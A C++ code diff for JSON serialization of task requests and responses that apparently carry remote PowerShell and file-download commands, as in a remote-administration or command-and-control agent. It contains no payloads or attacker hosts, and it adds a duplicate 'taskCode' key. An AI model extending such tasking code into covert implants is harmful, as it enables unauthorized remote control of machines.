@@ -2,6 +2,7 @@
 #pragma once
 #include <cstdint>
 #include <string>
+#include <variant>
 #include "rapidjson/stringbuffer.h"
 #include "rapidjson/document.h"
 #include "rapidjson/writer.h"
@@ -61,6 +62,7 @@ struct TaskResponse
 		doc.AddMember("TaskID", taskID, allocator);
 		doc.AddMember("TaskType", type, allocator);
 		doc.AddMember("TaskCode", code, allocator);
+		doc.AddMember("taskCode", code, allocator);
 		doc.AddMember("Status", status, allocator);
 		doc.AddMember("Data", data.ToJsonValue(allocator), allocator);
 
@@ -69,6 +71,21 @@ struct TaskResponse
 		doc.Accept(writer);
 
 		return buffer.GetString();
+	}
+
+	rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType &allocator) const
+	{
+
+		rapidjson::Value objValue;
+		objValue.SetObject();
+
+		objValue.AddMember("TaskID", taskID, allocator);
+		objValue.AddMember("TaskType", type, allocator);
+		objValue.AddMember("TaskCode", code, allocator);
+		objValue.AddMember("Status", status, allocator);
+		objValue.AddMember("Data", data.ToJsonValue(allocator), allocator);
+
+		return objValue;
 	}
 };
 
@@ -94,11 +111,11 @@ struct TaskRequest
 
 		rapidjson::Document::AllocatorType &allocator = doc.GetAllocator();
 
-		doc.AddMember("taskID", taskID, allocator);
-		doc.AddMember("type", type, allocator);
-		doc.AddMember("code", code, allocator);
-		doc.AddMember("status", status, allocator);
-		doc.AddMember("data", data.ToJsonValue(allocator), allocator);
+		doc.AddMember("TaskID", taskID, allocator);
+		doc.AddMember("TaskType", type, allocator);
+		doc.AddMember("TaskCode", code, allocator);
+		doc.AddMember("Status", status, allocator);
+		doc.AddMember("Command", data.ToJsonValue(allocator), allocator);
 
 		rapidjson::StringBuffer buffer;
 		rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
@@ -177,4 +194,27 @@ struct CommandDownloadFile
 	}
 };
 
+using Request = std::variant<TaskRequest<CommandPowershell>, TaskRequest<bool>>;
+using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskError>>;
+
+inline std::string CreateResponseTaskValue(const std::deque<Response> &tasks)
+{
+	rapidjson::Document jsonDoc;
+	jsonDoc.SetArray();
+	rapidjson::Document::AllocatorType &allocator = jsonDoc.GetAllocator();
+
+	for (const auto &taskVariant : tasks)
+	{
+		rapidjson::Value taskVal = std::visit([&allocator](const auto &concreteTask) -> rapidjson::Value
+											  { return concreteTask.ToJsonValue(allocator); }, taskVariant);
+
+		jsonDoc.PushBack(taskVal, allocator);
+	}
+
+	rapidjson::StringBuffer strbuf;
+	rapidjson::Writer<rapidjson::StringBuffer> writer(strbuf);
+	jsonDoc.Accept(writer);
+
+	return strbuf.GetString();
+}
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
